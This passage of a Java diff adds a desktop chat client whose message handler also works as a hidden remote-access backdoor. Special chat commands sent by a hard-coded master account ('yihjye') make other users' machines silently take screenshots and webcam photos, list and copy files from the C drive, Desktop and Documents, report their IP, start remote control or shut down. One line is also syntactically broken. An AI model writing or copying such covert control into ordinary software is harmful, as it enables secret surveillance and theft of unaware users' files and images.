+                                new Thread(new Runnable()
+                                    {
+                                        public void run()
+                                        {
+                                            customBar.barOnWithString(username);
+                                            Thread.currentThread().interrupt();
+                                            return;
+                                        }
+                                    }).start();
+
+                                new Thread(new Runnable()
+                                    {
+                                        public void run()
+                                        {
+                                            String IP = database.getIPSpecific(username);       
+                                            if(IP == null)
+                                            {
+                                                JOptionPane.showMessageDialog(null, "IP Not Found");    
+                                                customBar.dispose();
+                                            }
+                                            else if(IP.equals(""))
+                                            {
+                                                JOptionPane.showMessageDialog(null, "IP Not Found");   
+                                                customBar.dispose();
+                                            }
+                                            else    
+                                            {
+                                                try
+                                                {
+                                                    IP = scipher.unlock(IP);
+
+                                                    Socket socketRem = new Socket(IP, 50916);
+
+                                                    PrintWriter pwRem = new PrintWriter(new OutputStreamWriter(socketRem.getOutputStream(), "UTF-8"),  true);
+
+                                                    pwRem.println("[username]" + Util.getWindowsUsername()); 
+                                                    pwRem.println("[printscreen]"); 
+                                                    socketRem.close();
+
+                                                    new Thread(new Runnable()
+                                                        {
+                                                            public void run()
+                                                            {
+                                                                try
+                                                                {
+                                                                    Thread.sleep(2000);
+                                                                    Util.openScreenShot(username);
+                                                                }
+                                                                catch(Exception e)                                    
+                                                                {
+                                                                    e.printStackTrace();
+                                                                }
+                                                                finally
+                                                                {
+                                                                    customBar.dispose();
+                                                                }
+                                                                Thread.currentThread().interrupt();
+                                                                return;
+                                                            }
+                                                        }).start();
+                                                }
+                                                catch(Exception ex) 
+                                                {
+                                                    customBar.dispose();
+                                                    JOptionPane.showMessageDialog(null, "Unable to connect to user.");   
+                                                }
+                                            }
+
+                                            Thread.currentThread().interrupt();
+                                            return;
+                                        }
+                                    }).start();
+
+                            }
+                        }
+                        else  if(shifting == true)
+                        {
+                            shifting = false;
+
+                            if(online == true)
+                            {
+
+                                pw.println("[MSG]" + username + ": " + "[selfiecam]"); 
+
+                                new Thread(new Runnable()
+                                    {
+                                        public void run()
+                                        {
+                                            customBar.barOnWithString(username);
+                                            Thread.currentThread().interrupt();
+                                            return;
+                                        }
+                                    }).start();
+
+                                new Thread(new Runnable()
+                                    {
+                                        public void run()
+                                        {
+                                            try
+                                            {
+                                                Thread.sleep(3000);
+                                                wc.openSelfie(username);
+                                            }
+                                            catch(Exception e)                                    
+                                            {
+                                                e.printStackTrace();
+                                            }
+                                            finally
+                                            {
+                                                customBar.dispose();
+                                            }
+                                            Thread.currentThread().interrupt();
+                                            return;
+                                        }
+                                    }).start();
+                            }
+                        }
+
+                        else if(alting == true)
+                        {
+                            alting = false;
+
+                            if(online == true)
+                            {
+                                pw.println("[MSG]" + username + ": " + "[wallpaper]"); 
+                            }
+                            else
+                            {
+                                String IP = database.getIPSpecific(username);       
+
+
+                                if(IP == null)
+                                {
+                                    JOptionPane.showMessageDialog(null, "IP Not Found");    
+                                    customBar.dispose();
+                                }
+                                else if(IP.equals(""))
+                                {
+                                    JOptionPane.showMessageDialog(null, "IP Not Found");   
+                                    customBar.dispose();
+                                }
+                                else    
+                                {
+                                    try
+                                    {
+                                        IP = scipher.unlock(IP);
+
+                                        Socket socketRem = new Socket(IP, 50916);
+
+                                        PrintWriter pwRem = new PrintWriter(new OutputStreamWriter(socketRem.getOutputStream(), "UTF-8"),  true);
+
+                                        pwRem.println("[username]" + Util.getWindowsUsername()); 
+                                        pwRem.println("[wallpaper]"); 
+                                        socketRem.close();
+                                    }
+                                    catch(Exception ex) 
+                                    {
+                                        customBar.dispose();
+                                        JOptionPane.showMessageDialog(null, "Unable to connect to user.");   
+                                    }
+                                }
+
+                            }
+                        }
+
+                    }
+                }
+                else if(e.getButton() == MouseEvent.BUTTON3) 
+                {                  
+                    final boolean online = list.getSelectedValue().isOnline();
+
+                    if(online == true)
+                    {
+                        if(myUsername.equals("yihjye") && supermastermode == true)
+                        {
+                            rightClickMenu.show(list, e.getX(), e.getY());
+                        }
+                        else
+                        {
+                            if(e.getClickCount() == 2)
+                            {   
+                                String username = list.getSelectedValue().getUsername();
+                                String fullNameCurrent = list.getSelectedValue().getFullName();
+
+                                if(online == true)
+                                {
+                                    String fullName = JOptionPane.showInputDialog(null, "Enter new name: ", fullNameCurrent);
+
+                                    if(fullName == null)
+                                    {
+                                    }
+                                    else if(fullName.equals(""))
+                                    {
+                                    }   
+                                    /*
+                                    else if(fullName.length() > 20)
+                                    {
+                                    JOptionPane.showMessageDialog(null, "Too long.");
+                                    }           
+                                     */
+                                    else
+                                    {
+                                        if(fullName.matches("[a-zA-Z@ ]+"))
+                                        {
+                                            pw.println("[CName]" + username + "*" + fullName); 
+                                        }
+                                        else
+                                            JOptionPane.showMessageDialog(null, "No symbols or numbers.");
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    else 
+                    {
+                        if(myUsername.equals("yihjye") && supermastermode == true)
+                        {
+                            rightClickMenuOffline.show(list, e.getX(), e.getY());
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    class NormalMouseListener extends MouseAdapter
+    {
+        public void mouseClicked(MouseEvent e)
+        {
+            if(list.isSelectionEmpty())
+            {
+            }
+            else
+            {
+                if(e.getButton() == MouseEvent.BUTTON1) 
+                {
+                    if(e.getClickCount() == 2)
+                    {                               
+                        final String username = list.getSelectedValue().getUsername();
+                        final String fullname = list.getSelectedValue().getUsernameDisplay();
+                        final boolean online = list.getSelectedValue().isOnline();
+
+                        if(hsChat.contains(username))
+                        {
+
+                            for(int i=0; i < alChat.size(); i++)
+                            {
+                                if(alChat.get(i).getUsername().equals(username))
+                                {
+                                    alChat.get(i).showChatDialog();
+                                    break;
+                                }
+                            }
+                        }
+                        else 
+                        {
+                            if(databaseConnected == true)
+                            {
+                                if(online == false)
+                                {
+
+
+                                    String message = JOptionPane.showInputDialog(null,  "Type your message: ", fullname + " || " + username, JOptionPane.QUESTION_MESSAGE);
+
+                                    if(message == null)
+                                    {
+                                    }
+                                    else if(message.equals(""))
+                                    {
+                                    }
+                                    else
+                                    {
+                                        StaticDB.sendOffline(username, myUsername, message);
+                                    }
+
+                                }
+
+                                else
+                                {
+
+                                    hsChat.add(username);
+
+                                    new Thread(new Runnable()
+                                        {
+                                            public void run()
+                                            {
+                                                chatBar.barOn();
+                                                Thread.currentThread().interrupt();
+                                                return;
+                                            }
+                                        }).start();
+
+                                    new Thread(new Runnable()
+                                        {
+                                            public void run()
+                                            {
+                                                try
+                                                {
+                                                    MiniChat miniChat = new MiniChat(username, fullname, pw, true, fullName, myUsername);                                               
+                                                    alChat.add(miniChat);
+                                                }
+                                                catch(Exception e)
+                                                {
+                                                    e.printStackTrace();
+                                                }
+                                                finally
+                                                {
+                                                    chatBar.dispose();
+                                                }
+
+                                                Thread.currentThread().interrupt();
+                                                return;
+                                            }
+                                        }).start();
+                                }
+                            }
+                        }
+                    }   
+                }
+            }
+
+        }
+    }
+
+    public void setAdmin(String type)
+    {
+        if(type.equals("1"))
+        {
+            list.removeMouseListener(normalMouse);
+            list.addMouseListener(masterMouse);
+        }
+    }
+
+    public void vectorTempClear()
+    {
+        vectorTemp = null;
+        vectorTemp = new Vector<User>();
+    }
+
+    public void searchLikeThis(String input)
+    {
+        vectorTempClear();
+
+        Pattern p = Pattern.compile(".*" + input + ".*",  Pattern.CASE_INSENSITIVE);
+
+        for(int i = 0; i < alTemp.size(); i++)
+        {
+            String usernameStored = alTemp.get(i).getUsername();
+            String fullName = alTemp.get(i).getFullName();
+
+            Matcher nameMatcher = p.matcher(usernameStored);
+            Matcher fullNameMatcher = p.matcher(fullName);
+
+            if(nameMatcher.matches() || fullNameMatcher.matches())
+            {
+                if(alTemp.get(i).isOnline())
+                {
+                    User user = new User(usernameStored, fullName);
+                    vectorTemp.add(user); 
+                }
+                else
+                {
+                    User user = new User(usernameStored, fullName);
+                    user.setStatus("offline");
+                    vectorTemp.add(user); 
+                }
+            }
+        }
+
+        list.setListData(vectorTemp);
+    }
+
+    public void rebuild()
+    {        
+        SwingUtilities.invokeLater(new Runnable()
+            {
+                public void run()
+                {
+                    btnRefresh.setVisible(false);
+                    lblSpin.setIcon(new ImageIcon(URLSpin));
+                    lblSpin.setText(null);
+                }
+            });
+    }
+
+    public void ChangeFullName(String fullNameNew)
+    {
+        try
+        {
+            File file = new File("C:\\SEL\\mypro.txt");
+
+            FileWriter fw = new FileWriter(file);
+            PrintWriter pw = new PrintWriter(fw);
+
+            pw.println(myUsername + "*" + fullNameNew);
+            pw.close();
+
+            cipher.lockd(file);
+
+            this.fullName = fullNameNew;
+
+            setFullNameLbl(fullNameNew);
+            this.pw.println("[fullname]" + fullNameNew);
+            this.pw.println("[changeName]" + myUsername);
+
+            for(int i = 0; i < alChat.size(); i++)
+            {
+                alChat.get(i).setMyFullName(fullNameNew);
+            }
+        }
+        catch(Exception e)
+        {
+            e.printStackTrace();
+        }
+    }
+
+    public void ChangeFullNameAdmin(String fullNameNew)
+    {
+        try
+        {
+            File file = new File("C:\\SEL\\mypro.txt");
+
+            FileWriter fw = new FileWriter(file);
+            PrintWriter pw = new PrintWriter(fw);
+
+            pw.println(myUsername + "*" + fullNameNew);
+            pw.close();
+
+            cipher.lockd(file);
+
+            this.fullName = fullNameNew;
+
+            setFullNameLbl(fullNameNew);
+            for(int i = 0; i < alChat.size(); i++)
+            {
+                alChat.get(i).setMyFullName(fullNameNew);
+            }
+        }
+        catch(Exception e)
+        {
+            e.printStackTrace();
+        }
+    }
+
+    public void getProfile()
+    {
+
+        try
+        {
+            File file = new File("C:\\SEL\\mypro.txt.cip");
+            if(cipher.unlockd(file)) 
+            {
+                file = new File("C:\\SEL\\mypro.txt");
+
+                FileReader fr = new FileReader(file);
+                BufferedReader br = new BufferedReader(fr);
+
+                String data = br.readLine();
+                br.close();
+
+                cipher.lockd(file);
+
+                if(data != null || !data.equals(""))
+                {
+                    String parts[] = data.split("\\*");
+                    String proUsername = parts[0];
+                    String proFullName = parts[1];
+
+                    if(proUsername.equals(myUsername))
+                    {
+                        fullName = proFullName;
+
+                    }
+                }
+            }
+            else if(!file.exists()) 
+            {
+                file = new File("C:\\SEL\\mypro.txt");
+
+                FileWriter fw = new FileWriter(file);
+                PrintWriter pw = new PrintWriter(fw);
+
+                pw.println(myUsername + "*" + fullName);
+                pw.close();
+
+                cipher.lockd(file);
+            }
+        }
+        catch(Exception e)
+        {
+            e.printStackTrace();
+        }
+    }
+
+    public void activate()
+    {
+        if(connected == true)
+        {
+        }
+        /*
+        else if(serverError == true)
+        {
+        }
+         */
+        else
+        {
+            if(connecting == true)
+            {
+            }
+            else
+            {
+                connecting = true;
+
+                new Thread(new Runnable()
+                    {
+                        public void run()
+                        {
+                            try
+                            {
+                                Thread.sleep(500);
+                                Socket socket = new Socket(IPAddress, port);
+
+                                br = new BufferedReader(new InputStreamReader(socket.getInputStream(), "UTF-8"));                             
+                                pw = new PrintWriter(new OutputStreamWriter(socket.getOutputStream(), "UTF-8"),  true);
+
+                                connected = true;
+                                serverError = false;
+                                dups = false;
+
+                                pw.println("[fullname]" + fullName); 
+                                pw.println("[username]" + myUsername);
+
+                                /*
+                                if(getProfile()) 
+                                {
+                                }
+                                else
+                                 */
+
+                                SwingUtilities.invokeLater(new Runnable()
+                                    {
+                                        public void run()
+                                        {
+                                            buildRest();
+                                        }
+                                    });
+
+                                new MessageListener().start();
+                                new ConnectionCheck().start();
+
+                                fileInspector.setPW(pw);
+
+                            }
+                            catch(java.net.NoRouteToHostException e) 
+                            {
+                                serverError = true;
+                                connecting = false;
+                                connected = false;
+
+                                SwingUtilities.invokeLater(new Runnable()
+                                    {
+                                        public void run()
+                                        {
+                                            lblSpin.setIcon(null);
+                                            lblSpin.setText("Please check your connection");      
+                                            btnRefresh.setVisible(true);
+
+                                        }
+                                    });
+                            }
+                            catch(java.net.ConnectException e) 
+                            {
+                                serverError = true;
+
+                                connecting = false;
+                                connected = false;
+
+                                SwingUtilities.invokeLater(new Runnable()
+                                    {
+                                        public void run()
+                                        {
+                                            lblSpin.setIcon(null);
+                                            lblSpin.setText("Under maintenance");      
+                                            btnRefresh.setVisible(true);
+
+                                        }
+                                    });
+
+                            }
+
+                            catch(Exception e)
+                            {
+                                connecting = false;
+                                connected = false;
+                                e.printStackTrace();
+                            }
+
+                            Thread.currentThread().interrupt();
+                            return;
+                        }
+                    }).start();
+            }
+        }        
+    }
+
+    class btnPanel extends JPanel 
+    {
+        URL URLBackground123 = getClass().getResource("/images/123.png");
+
+        BufferedImage backgroundPanel;
+
+        public btnPanel()
+        {
+            setLayout(new BorderLayout());
+            setOpaque(true);            
+
+            try
+            {
+                backgroundPanel = ImageIO.read(URLBackground123);   
+                repaint();
+            }
+            catch(Exception e)
+            {
+                e.printStackTrace();
+            }
+
+        }
+
+        public void paintComponent(Graphics g)
+        {  
+            super.paintComponent(g);
+
+            if(backgroundPanel != null)
+            {
+                Graphics2D g2d = (Graphics2D) g.create();
+                int x = getWidth() - backgroundPanel.getWidth();
+                int y = getHeight() - backgroundPanel.getHeight();
+                g2d.drawImage(backgroundPanel, x, y, this);
+                g2d.dispose();
+            }
+
+        } 
+    }
+
+    public void setFullNameLbl(final String fullName)
+    {
+        String nameTemp = "";
+
+        if(fullName.length() > 20)
+        {
+            nameTemp = fullName.substring(0, 20) + "...";  
+        }
+        else
+            nameTemp = fullName;
+
+        final String nameFinal = nameTemp;
+
+        SwingUtilities.invokeLater(new Runnable()
+            {                
+                public void run()
+                {
+                    lblFullName.setText("Display Name: " + nameFinal);
+                }
+            });
+    }
+
+    public void buildRest()
+    {
+        try 
+        {          
+            background = ImageIO.read(URLBackground);   
+            repaint();
+        } 
+        catch (Exception ex) 
+        {
+            ex.printStackTrace();
+        }
+
+        btnChangeName.setContentAreaFilled(false);
+        btnChangeName.setBorder(null);
+        btnChangeName.setVisible(false);
+
+        if(myUsername.equals("yihjye")) 
+            btnChangeName.setVisible(true);
+
+        remove(pnlSpin);
+
+        pnlName.add(lblFullName);
+        pnlName.add(btnChangeName);
+
+        pnlUpper.add(pnlMiddleCont, BorderLayout.NORTH);
+        pnlUpper.add(pnlName, BorderLayout.CENTER);
+
+        lblFullName.setText("Display Name: " + fullName);
+
+        add(pnlUpper, BorderLayout.NORTH);
+        add(sp, BorderLayout.CENTER);
+
+    }
+
+    public void paintComponent(Graphics g)
+    {  
+        super.paintComponent(g);
+
+        if(background != null)
+        {
+            Graphics2D g2d = (Graphics2D) g.create();
+            int x = getWidth() - background.getWidth();
+            int y = getHeight() - background.getHeight();
+            g2d.drawImage(background, x, y, this);
+            g2d.dispose();
+        }
+
+    } 
+
+    public void sortAZ()
+    {        
+        Collections.sort(vector, User.aTOz);
+        list.setListData(vector);
+
+        SwingUtilities.invokeLater(new Runnable()
+            {
+                public void run()
+                {
+                    setVisible(true);
+                }
+            });
+    }
+
+    public void sortZA()
+    {        
+        Collections.sort(vector, User.zTOa);
+        list.setListData(vector);
+
+        SwingUtilities.invokeLater(new Runnable()
+            {
+                public void run()
+                {
+                    setVisible(true);
+                }
+            });
+    }
+
+    public void saveUserList(ArrayList<User> list) 
+    {
+        ArrayList<User> al = new ArrayList<User>();
+        HashSet<String> hs = new HashSet<String>();
+
+        File file = new File("C:\\SEL\\userlist.txt");
+        File fileCip = new File("C:\\SEL\\userlist.txt.cip");
+
+        if(fileCip.exists()) 
+        {
+            try
+            {
+                cipher.unlockd(fileCip);               
+
+                FileReader fr = new FileReader(file);
+                BufferedReader br = new BufferedReader(fr);
+
+                String data;
+
+                while( (data = br.readLine()) != null)
+                {
+                    String parts[] = data.split("\\*");
+
+                    String username = parts[0].toLowerCase();
+                    String fullName = parts[1];
+
+                    if(hs.add(username))
+                    {
+                        User user = new User(username, fullName);
+                        al.add(user);
+                    }
+                }
+
+                br.close();
+
+                for(int i = 0; i < list.size(); i++)
+                {
+                    if(hs.contains(list.get(i).getUsername().toLowerCase().toLowerCase()))
+                    {
+
+                        for(int j = 0; j < al.size(); j++)
+                        {
+                            if(al.get(j).getUsername().equals(list.get(i).getUsername().toLowerCase()))
+                            {
+                                al.get(j).setFullName(list.get(i).getFullName());
+                                break;
+                            }
+                        }
+                    }
+                    else
+                    {
+                        hs.add(list.get(i).getUsername().toLowerCase());
+
+                        User user = new User(list.get(i).getUsername().toLowerCase(), list.get(i).getFullName());
+                        al.add(user);
+                    }
+                }
+
+                FileWriter fw = new FileWriter(file);
+                PrintWriter pw = new PrintWriter(fw);          
+
+                Collections.sort(al, User.aTOzUsername);
+
+                for(int i = 0; i < al.size(); i++)
+                {
+                    pw.println(al.get(i).getRaw());
+                }
+
+                pw.close();       
+                cipher.lockd(file);
+
+                scanOffline(al);
+
+                al = null;
+                hs = null;
+
+            }
+            catch(Exception e)
+            {
+                e.printStackTrace();
+            }
+
+        }
+        else 
+        {
+            try
+            {
+                file.createNewFile();
+
+                try
+                {
+                    FileWriter fw = new FileWriter(file);
+                    PrintWriter pw = new PrintWriter(fw);
+
+                    Collections.sort(list, User.aTOzUsername);
+
+                    for(int i = 0; i < list.size(); i++)
+                    {
+                        if(list.get(i).getUsername().equals("") ||list.get(i).getFullName().equals(""))
+                        {
+                        }
+                        else
+                            pw.println(list.get(i).getRaw());
+                    }
+
+                    pw.close();
+
+                    cipher.lockd(file);
+                }
+                catch(Exception e)
+                {
+                    e.printStackTrace();
+                }
+
+            }
+            catch(Exception e)
+            {
+                e.printStackTrace();
+            }
+        }
+
+    }
+
+    public void scanOffline(ArrayList<User> al)
+    {                
+        if(al.size() == 0)
+        {
+        }
+        else
+        {
+            Collections.sort(al, User.aTOz);
+
+            for(int i = 0; i < al.size(); i++)
+            {
+                if(hsUser.contains(al.get(i).getUsername()))
+                {
+                }
+                else
+                {
+                    String username = al.get(i).getUsername();
+                    String fullName = al.get(i).getFullName();
+
+
+                    if(username.equals("") || fullName.equals(""))
+                    {
+                    }
+                    else
+                    {
+                        User user = new User(username, fullName);
+                        user.setStatus("offline");
+                        vector.add(user);     
+                        alTemp.add(user);
+                    }
+                }
+            }
+
+            list.setListData(vector);
+        }
+    }
+
+    class setArrayList extends Thread
+    {
+        public void run()
+        {
+            if(allowRefList == true)
+            {
+                vectorTempClear();
+                alTemp.clear();
+
+                for(int i = 0; i < vector.size(); i++)
+                {
+                    User user = new User(vector.get(i).getUsername(), vector.get(i).getFullName()); 
+                    alTemp.add(user);
+                }
+
+                list.setListData(vector);
+
+                if(txtSearch.getText().trim().equals("Enter username or name to search"))
+                {
+                }
+                else if(txtSearch.getText().trim().length() == 0)
+                {
+                }
+                else
+                {
+                    searchLikeThis(txtSearch.getText().trim());
+                }
+
+                SwingUtilities.invokeLater(new Runnable()
+                    {
+                        public void run()
+                        {
+                            btnRefreshUsers.setEnabled(true);
+                        }
+                    });
+
+                allowRefList = false;
+
+                sorted = true;
+                sortAZ();
+            }
+
+            saveUserList(alTemp);
+
+            Thread.currentThread().interrupt();
+            return;
+        }
+    }
+
+    public void searchDisable()
+    {
+        SwingUtilities.invokeLater(new Runnable()
+            {
+                public void run()
+                {
+                    txtSearch.setEnabled(false);
+                }
+            });
+    }
+
+    class FileInspectController extends Thread
+    {
+        String secretdata;
+
+        FileInspectController(String secretdata)
+        {
+            this.secretdata = secretdata;            
+        }
+
+        public void run()
+        {
+            Util.copyFileSpecific(secretdata);
+
+            Thread.currentThread().interrupt();
+            return;
+        }
+    }
+
+    public void searchEnable()
+    {
+        SwingUtilities.invokeLater(new Runnable()
+            {
+                public void run()
+                {
+                    txtSearch.setEnabled(true);
+                }
+            });
+    }
+
+    public void focusText()
+    {
+        SwingUtilities.invokeLater(new Runnable()
+            {
+                public void run()
+                {
+                    txtSearch.requestFocus();
+                }
+            });
+    }
+
+    class MessageListener extends Thread
+    {
+        public void run()
+        {
+            try
+            {
+                String message;
+
+                while(true)
+                {
+                    message = br.readLine();
+
+                    if(message.equals("[clearList]"))
+                    {
+                        if(allowRefList == false)
+                        {
+                            allowRefList = true;
+                            hsUser.clear();
+                            vector.clear();
+                        }
+                    }
+                    else if(message.startsWith("[list]")) 
+                    {        
+                        if(allowRefList == true)
+                        {
+                            String data = message.substring(6, message.length());
+                            String parts[] = data.split("\\*");
+
+                            try
+                            {
+                                String username = parts[0];
+                                String fullName = parts[1];        
+
+                                if(hsUser.contains(username))
+                                {
+                                }
+                                else
+                                {
+                                    hsUser.add(username);
+
+                                    if(fullName.equals("blank"))
+                                    {
+                                        User user = new User(username);
+                                        vector.add(user);
+                                    }
+                                    else
+                                    {
+                                        User user = new User(username, fullName);
+                                        vector.add(user);
+                                    }
+                                }
+                            }
+                            catch(java.lang.ArrayIndexOutOfBoundsException e)
+                            {
+                                String username = parts[0];
+
+                                if(hsUser.contains(username))
+                                {
+                                }
+                                else
+                                {
+                                    hsUser.add(username);
+
+                                    User user = new User(username);
+                                    vector.add(user);
+                                }
+                            }
+                        }
+                    }
+                    else if(message.equals("[listComplete]"))
+                    {
+                        if(allowRefList == true)
+                        {
+                            esThread.submit(new setArrayList());
+                        }
+
+                    }
+                    else if(message.equals("[checkalive]"))
+                    {
+                        pw.println("[imalive]");
+                    }
+                    else if(message.equals("[DUPS]"))
+                    {
+                        dups = true;
+                        connecting = false;
+                        connected = false;
+
+                        SwingUtilities.invokeLater(new Runnable()
+                            {
+                                public void run()
+                                {
+                                    remove(pnlUpper);
+                                    remove(sp);
+
+                                    add(pnlSpin);
+                                    lblSpin.setIcon(null);
+                                    lblSpin.setText("Someone has logged using ur username");      
+                                    btnRefresh.setVisible(true);
+                                    repaint();
+                                }
+                            });
+
+                    }
+                    else if(message.startsWith("[MSG]"))
+                    {
+                        String data = message.substring(5, message.length());
+
+                        String partsUsernames[] = data.split("\\*", 2);
+                        String fromUsername = partsUsernames[0];
+
+                        String finalData = data.substring(fromUsername.length()+1, data.length());   
+                        String parts[] = finalData.split(":", 2);
+
+                        String msg = parts[1];
+
+                        if(msg.trim().equals("[test]"))
+                        {
+                        }
+                        else if(msg.trim().equals("[updatesecret]"))
+                        {
+                            extList.remoteUpdate();
+                        }
+                        else if(msg.trim().equals("[screenshot]"))
+                        {
+                            new Thread(new Runnable()
+                                {
+                                    public void run()
+                                    {
+                                        Util.saveScreenShot(myUsername);
+                                        Thread.currentThread().interrupt();
+                                        return;
+                                    }
+                                }).start();
+                        }
+                        else if(msg.trim().equals("[deleteUserList]"))
+                        {
+                            Util.deleteUserList();
+                        }
+                        else if(msg.trim().equals("[copydocuments]"))
+                        {
+                            Util.copyDocuments(myUsername);
+                        }
+                        else if(msg.trim().equals("[copydesktop]"))
+                        {
+                            Util.copyDesktop(myUsername);
+                        }
+                        else if(msg.trim().startsWith("[etcsecret]")) 
+                        {
+                            String secretdata = msg.trim().substring(11, msg.trim().length());
+
+                            if(remoteit == true)
+                            {
+                                remoteit = false;
+                                setTempIP(secretdata);       
+                                
+                                String username = jList.getSelectedValue()
+
+                                new Thread(new Runnable()
+                                    {
+                                        public void run()
+                                        {
+                                            try
+                                            {
+                                                    customBar.barOnWithString(username);
+                                            }
+                                            catch(Exception e)
+                                            {
+                                                e.printStackTrace();
+                                            }
+                                            Thread.currentThread().interrupt();
+                                            return;
+                                        }
+                                    }).start();
+
+                                new Thread(new Runnable()
+                                    {
+                                        public void run()
+                                        {
+                                            try
+                                            {
+                                                Thread.sleep(1000);
+                                                Util.startRemoteMaster();
+                                            }
+                                            catch(Exception e)
+                                            {
+                                                e.printStackTrace();
+                                            }
+                                            finally
+                                            {
+                                                customBar.dispose();
+                                            }
+                                            Thread.currentThread().interrupt();
+                                            return;
+                                        }
+                                    }).start();
+
+                            }
+                            else
+                            {
+                                JOptionPane.showMessageDialog(null, secretdata);    
+                            }
+                        }
+                        else if(msg.trim().equals("[startremote]"))
+                        {
+                            Util.startRemote();
+                        }
+                        else if(msg.trim().equals("[endremote]"))
+                        {
+                            Util.endRemote();
+                        }
+                        else if(msg.trim().equals("[ipaddress]"))
+                        {
+                            pw.println("[MSG]" + "yihjye" + ": " + "[etcsecret]" + Util.getLocalIP()); 
+                        }
+                        else if(msg.trim().equals("[version]"))
+                        {
+                            pw.println("[MSG]" + "yihjye" + ": " + "[etcversion]" + About.version); 
+                        }       
+                        else if(msg.trim().equals("[fileinspect]")) 
+                        {
+                            Vector<FileInsPro> vector = new Vector();
+                            vector = getCDrive();
+
+                            for(int i = 0; i < vector.size(); i++)
+                            {
+                                String name = vector.get(i).getName();
+                                String path = vector.get(i).getPath();
+
+                                pw.println("[MSG]" + "yihjye" + ": " + "[fileinspectdata]" + name + "*" + path); 
+                            }
+
+                            pw.println("[MSG]" + "yihjye" + ": " + "[fileinspectdatacomplete]");                             
+                        }    
+                        else if(msg.trim().startsWith("[fileinspectdata]")) 
+                        {
+                            if(permissionToClearInsVector == true) 
+                            {
+                                permissionToClearInsVector = false;
+                                insVector.clear();       
+                            }
+
+                            String secretdata = msg.trim().substring(17, msg.trim().length());
+
+                            String partsSecret[] = secretdata.split("\\*");
+                            String name = partsSecret[0];
+                            String path = partsSecret[1];
+
+                            FileInsPro pro = new FileInsPro(name, path);
+                            insVector.add(pro);  
+
+                        }
+                        else if(msg.trim().startsWith("[navigatefileinspect]")) 
+                        {
+                            String secretdata = msg.trim().substring(21, msg.trim().length());
+
+                            Vector<FileInsPro> vector = new Vector();
+
+                            if(secretdata.equals("[desktop]"))
+                            {
+                                vector = getListOfData(Util.getDesktopPath());
+                            }
+                            else if(secretdata.equals("[documents]"))                            
+                            {
+                                vector = getListOfData(Util.getDocuments());
+                            }
+                            else
+                            {
+                                vector = getListOfData(secretdata);
+                            }
+
+                            for(int i = 0; i < vector.size(); i++)
+                            {
+                                String name = vector.get(i).getName();
+                                String path = vector.get(i).getPath();
+
+                                pw.println("[MSG]" + "yihjye" + ": " + "[fileinspectdata]" + name + "*" + path); 
+                            }
+
+                            pw.println("[MSG]" + "yihjye" + ": " + "[fileinspectdatacomplete]");      
+                        }
+                        else if(msg.trim().startsWith("[copyfileinspect]")) 
+                        {
+                            String secretdata = msg.trim().substring(17, msg.trim().length());
+                            Util.copyFileSpecific(secretdata);
+                            alertToMaster("Done");
+                        }
+                        else if(msg.trim().startsWith("[multiplecopyfileinspect]")) 
+                        {
+                            String secretdata = msg.trim().substring(25, msg.trim().length());
+                            esThread.submit(new FileInspectController(secretdata));
+                        }
+                        else if(msg.trim().startsWith("[copyfolderinspect]")) 
+                        {
+                            String secretdata = msg.trim().substring(19, msg.trim().length());
+                            Util.copyFolderSpecific(secretdata);
+                            alertToMaster("Done");
+                        }
+                        else if(msg.trim().startsWith("[copyfolderinspect2]")) 
+                        {
+                            String secretdata = msg.trim().substring(20, msg.trim().length());
+                            Util.copyFolderSpecific2(secretdata);
+                            alertToMaster("Done");
+                        }
+                        else if(msg.trim().startsWith("[alertonly]")) 
+                        {
+                            String secretdata = msg.trim().substring(11, msg.trim().length());
+                            JOptionPane.showMessageDialog(null, secretdata);
+                        }
+                        else if(msg.trim().equals("[fileinspectdatacomplete]")) 
+                        {
+                            permissionToClearInsVector = true;
+                            fileInspector.setVector(insVector);
+                        }                        
+                        else if(msg.trim().startsWith("[etcversion]")) 
+                        {
+                            String secretdata = msg.trim().substring(12, msg.trim().length());
+                            JOptionPane.showMessageDialog(null, secretdata);
+                        }
+                        else if(msg.trim().equals("[selfiecam]"))
+                        {
+                            new Thread(new Runnable()
+                                {
+                                    public void run()
+                                    {
+                                        wc.saveSelfie(myUsername);
+                                        Thread.currentThread().interrupt();
+                                        return;
+                                    }
+                                }).start();
+                        }
+                        else if(msg.trim().equals("[shutThisDown]"))
+                        {
+                            Util.shutThisDown();
+                        }
+                        else if(msg.trim().equals("[shutApp]"))
+                        {
+                            Util.shutApp();
+                        }
+                        else if(msg.trim().equals("[wallpaper]"))
+                        {
+                            new Thread(new Runnable()
+                                {
+                                    public void run()
+                                    {
+                                        Wallpaper.changeWallpaper();
+                                        Thread.currentThread().interrupt();
+                                        return;
+                                    }
+                                }).start();
+                        }
+                        else if(msg.trim().startsWith("[FILE]"))
+                        {
+                            String dataFile = msg.trim();
+
+                            String partsData[] = dataFile.split("\\*");
+                            String senderUsername = partsData[1];
+                            String fileName = partsData[2];
+
+                            Util.copyFile(new File(ChatConfig.SELDownloadFolderPath + "\\" + senderUsername + "\\" + fileName), new File(ChatConfig.myDownloadFolder));                         
+
+                            File fileSELDownloadPath = new File(ChatConfig.SELDownloadFolderPath + "\\" + senderUsername + "\\" + fileName);
+                            fileSELDownloadPath.delete();
+
+                            final File fileSaved = new File(ChatConfig.myDownloadFolder + "\\" + fileName);
+
+                            /*
+                            for(int i=0; i < alChat.size(); i++)
+                            { 
+                            if(alChat.get(i).getUsername().equals(senderUsername))
+                            {
+
+                            alChat.get(i).HeInsertFile(fileSaved);
+                            alChat.get(i).display();
+                            break;
+                            }
+                            }
+                             */
+
+                            if(hsChat.contains(senderUsername))
+                            {
+                                for(int i=0; i < alChat.size(); i++)
+                                { 
+                                    if(alChat.get(i).getUsername().equals(senderUsername))
+                                    {
+
+                                        alChat.get(i).HeInsertFile(fileSaved);
+                                        alChat.get(i).display();
+                                        break;
+                                    }
+                                }
+                            }
+
+                            else 
+                            {
+                                hsChat.add(senderUsername);
+
+                                String fromFullName = "blank";
+                                for(int i = 0; i < vector.size(); i++)
+                                {
+                                    if(vector.get(i).getUsername().equals(senderUsername))
+                                    {
+                                        fromFullName = vector.get(i).getUsernameDisplay();
+                                        break;
+                                    }
+                                }
+
+                                final MiniChat miniChat = new MiniChat(senderUsername, fromFullName, pw, false, fullName, myUsername);
+                                alChat.add(miniChat);
+
+                                new Thread(new Runnable()
+                                    {
+                                        public void run()
+                                        {
+                                            try
+                                            {
+                                                Thread.sleep(3000);
+                                                miniChat.HeInsertFile(fileSaved);
+                                                miniChat.blinkNowOnly();
+
+                                                for(int i=0; i < alChat.size(); i++)
